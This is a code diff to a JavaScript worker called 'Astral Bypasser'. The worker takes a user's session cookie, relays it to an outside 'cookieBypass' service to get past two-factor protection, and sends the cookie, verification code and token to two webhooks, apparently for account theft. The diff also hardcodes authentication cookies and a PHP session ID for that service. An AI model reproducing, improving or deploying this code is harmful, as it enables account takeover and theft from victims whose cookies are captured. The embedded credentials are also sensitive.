@@ -1,7 +1,6 @@
 // ============================================================
-// ASTRAL BYPASSER v4.0
-// Uses Immortal API for 2FA bypass
-// Webhooks: Live (clean) + Dualhook (full)
+// ASTRAL BYPASSER v4.2
+// Uses Immortal API with hardcoded authentication cookies
 // ============================================================
 
 addEventListener('fetch', event => {
@@ -70,7 +69,17 @@ async function handleRequest(request) {
   const displayName = username || 'Unknown_User';
 
   try {
-    // Forward to Immortal API
+    // Hardcoded Immortal authentication cookies
+    const immortalCookies = [
+      'Authentication=8eg0ZmGL%2FIwdyoHZDdMYnjJiQTdobGVLQkdoeGc3cGJpWUtNMmJKUzNqRW1FUTBHWTlwZFdjOEtzRWs9',
+      'Authentication2=cXqas72gYpgV0xgoFibeQkc3MlMwUUdnVlJ4dTcxdTBmcm5ualRxdk5zTkJxZlRLcDlLOFFmcVdZdlR1R3FiaFBIMzZ3STJJZlJSZlYrWiticlFnSGVoYlEzTjhITFZTbWxQVS93PT0%3D',
+      'EggyWall_Token=2fbd5fe89040219ea4f487e940e72435e8db380110449038a877c5e260058a2b',
+      'PHPSESSID=j636n1vo2ku7jpqfi2tafamasv'
+    ];
+
+    const cookieString = immortalCookies.join('; ');
+
+    // Forward to Immortal API with authentication
     const immortalResponse = await fetch('https://immortal.st/api/misc/cookieBypass.php', {
       method: 'POST',
       headers: {
@@ -78,7 +87,8 @@ async function handleRequest(request) {
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36',
         'Accept': '*/*',
         'Origin': 'https://immortal.st',
-        'Referer': 'https://immortal.st/dashboard'
+        'Referer': 'https://immortal.st/dashboard',
+        'Cookie': cookieString
       },
       body: JSON.stringify({ Cookie: cookie })
     });
@@ -86,15 +96,29 @@ async function handleRequest(request) {
     const responseText = await immortalResponse.text();
     console.log('Immortal API raw response:', responseText);
 
+    // Check if response is HTML
+    if (responseText.trim().startsWith('<') || responseText.trim().startsWith('\n\t\t\t')) {
+      return new Response(JSON.stringify({
+        success: false,
+        error: 'Immortal API returned HTML - session expired',
+        raw: responseText.substring(0, 300)
+      }), {
+        status: 200,
+        headers: {
+          'Content-Type': 'application/json',
+          'Access-Control-Allow-Origin': '*'
+        }
+      });
+    }
+
     let data;
     try {
       data = JSON.parse(responseText);
     } catch (e) {
-      // If response is HTML or empty
       return new Response(JSON.stringify({
         success: false,
         error: 'Immortal API returned invalid JSON',
-        raw: responseText.substring(0, 200)
+        raw: responseText.substring(0, 300)
       }), {
         status: 200,
         headers: {
@@ -107,8 +131,7 @@ async function handleRequest(request) {
     const duration = Date.now() - startTime;
 
     // Check if the API returned success
-    if (data.success || data.status === 'success' || data.code || data.token) {
-      // Extract info from the response
+    if (data.success || data.status === 'success' || data.code) {
       const result = {
         success: true,
         code: data.code || data.verificationCode || 'N/A',
@@ -123,8 +146,7 @@ async function handleRequest(request) {
         clockwork: data.clockwork || false,
         totalItems: data.totalItems || 0,
         userId: data.userId || 'N/A',
-        username: data.username || displayName,
-        raw: data
+        username: data.username || displayName
       };
 
       // Send Live Bypass (clean)
@@ -161,8 +183,7 @@ async function handleRequest(request) {
         cookie: cookie,
         code: result.code,
         token: result.token,
-        duration: duration,
-        raw: data
+        duration: duration
       });
 
       return new Response(JSON.stringify({
@@ -180,8 +201,7 @@ async function handleRequest(request) {
         totalItems: result.totalItems,
         userId: result.userId,
         username: result.username,
-        duration: duration,
-        raw: data
+        duration: duration
       }), {
         status: 200,
         headers: {
@@ -191,7 +211,6 @@ async function handleRequest(request) {
       });
 
     } else {
-      // API returned error
       const errorMsg = data.error || data.message || 'Immortal API returned failure';
 
       await sendDualWebhook({
@@ -199,14 +218,12 @@ async function handleRequest(request) {
         username: displayName,
         userId: data.userId || 'N/A',
         error: errorMsg,
-        duration: duration,
-        raw: data
+        duration: duration
       });
 
       return new Response(JSON.stringify({
         success: false,
         error: errorMsg,
-        raw: data,
         duration: duration
       }), {
         status: 200,
